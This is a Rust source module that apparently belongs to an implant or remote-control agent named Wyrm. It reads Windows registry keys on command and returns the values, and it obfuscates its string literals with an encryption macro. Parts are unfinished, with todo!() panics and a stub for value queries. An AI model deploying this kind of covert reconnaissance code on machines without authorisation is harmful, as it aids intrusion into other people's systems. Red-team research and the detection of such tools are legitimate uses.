use std::slice::from_raw_parts;

use serde::Serialize;
use shared::{task_types::RegQueryInner, tasks::WyrmResult};
use str_crypter::{decrypt_string, sc};
use windows_registry::{CLASSES_ROOT, CURRENT_USER, Key, LOCAL_MACHINE, Transaction, USERS, Value};
use windows_sys::Win32::Foundation::GetLastError;

#[cfg(debug_assertions)]
use shared::pretty_print::print_failed;

pub fn reg_query(raw_input: &Option<String>) -> Option<impl Serialize> {
    let input_deser = match raw_input {
        Some(s) => match serde_json::from_str::<RegQueryInner>(s) {
            Ok(s) => s,
            Err(_) => todo!(),
        },
        None => todo!(),
    };

    // If the 2nd arg is empty, just query the key, otherwise query key + val
    if input_deser.1.is_none() {
        return query_key(input_deser.0);
    } else {
        return None;
    }
}

pub enum RegistryError {
    CannotExtractKey,
}

fn query_key(path: String) -> Option<impl Serialize> {
    let key = match extract_hive_from_str(&path) {
        Ok(k) => k,
        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
    };

    let path_stripped = match strip_hive(&path) {
        Ok(p) => p,
        Err(_) => return Some(WyrmResult::Err::<String>("Bad data".into())),
    };

    //
    // Try open the key, in the event of an error - return
    //
    let open_key = match key.open(path_stripped) {
        Ok(k) => k,
        Err(e) => {
            let le = unsafe { GetLastError() };
            let msg = format!("Failed with status: {le:#X}");

            #[cfg(debug_assertions)]
            {
                let msg = format!("{msg}, from crate: {e}");
                print_failed(&msg);
            }

            return Some(WyrmResult::Err(msg));
        }
    };

    //
    // As we are querying the key itself, we need to iterate through it
    //

    let vals = match open_key.values() {
        Ok(v) => v,
        Err(e) => {
            let le = unsafe { GetLastError() };
            let msg = format!("Failed with status: {le:#X}");

            #[cfg(debug_assertions)]
            {
                let msg = format!("{msg}, from crate: {e}");
                print_failed(&msg);
            }

            return Some(WyrmResult::Err(msg));
        }
    };

    let mut constructed: Vec<String> = vec![];

    // We got the values, so iterate them - we need to reconstruct everything as a string to send back
    for (name, data) in vals {
        let data_as_str = match data.ty() {
            windows_registry::Type::U32 => val_u32_to_str(&data),
            windows_registry::Type::U64 => val_u64_to_str(&data),
            windows_registry::Type::String => val_string_to_str(&data.to_vec()),
            windows_registry::Type::ExpandString => val_string_to_str(&data.to_vec()),
            windows_registry::Type::MultiString => val_string_to_str(&data.to_vec()),
            windows_registry::Type::Bytes => String::from("Not implemented"),
            windows_registry::Type::Other(_) => String::from("Not implemented"),
        };

        constructed.push(format!(
            "{} {name}{} {data_as_str}",
            sc!("Name:", 52).unwrap(),
            sc!(", Value:", 67).unwrap(),
        ));
    }

    // todo should be the result#
    match serde_json::to_string(&constructed) {
        Ok(s) => Some(WyrmResult::Ok(s)),
        Err(e) => {
            let msg = format!("{}. {e}", sc!("Could not serialise data.", 84).unwrap());
            Some(WyrmResult::Err(msg))
        }
    }
}

fn val_u32_to_str(value: &Value) -> String {
    u32::from_le_bytes(value[0..4].try_into().unwrap()).to_string()
}

fn val_u64_to_str(value: &Value) -> String {
    u64::from_le_bytes(value[0..8].try_into().unwrap()).to_string()
}

fn val_string_to_str(value: &[u8]) -> String {
    if value.len() < 2 {
        return String::new();
    }

    let u16_slice = unsafe { from_raw_parts(value.as_ptr() as *const u16, value.len() / 2) };
    String::from_utf16_lossy(u16_slice)
}

fn strip_hive<'a>(path: &'a str) -> Result<&'a str, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.1,
        None => return Err(RegistryError::CannotExtractKey),
    };

    Ok(hive)
}

/// Gets the hive from a given input str
fn extract_hive_from_str<'a>(path: &'a str) -> Result<&'a Key, RegistryError> {
    let hive = match path.split_once(r"\") {
        Some(s) => s.0,
        None => return Err(RegistryError::CannotExtractKey),
    };

    let key = match hive {
        "HKCU" => CURRENT_USER,
        "HKEY_CURRENT_USER" => CURRENT_USER,
        "HKLM" => LOCAL_MACHINE,
        "HKEY_LOCAL_MACHINE" => LOCAL_MACHINE,
        "HKCR" => CLASSES_ROOT,
        "HKEY_CLASSES_ROOT" => CLASSES_ROOT,
        "HKU" => USERS,
        "HKEY_USERS" => USERS,
        _ => return Err(RegistryError::CannotExtractKey),
    };

    Ok(key)
}
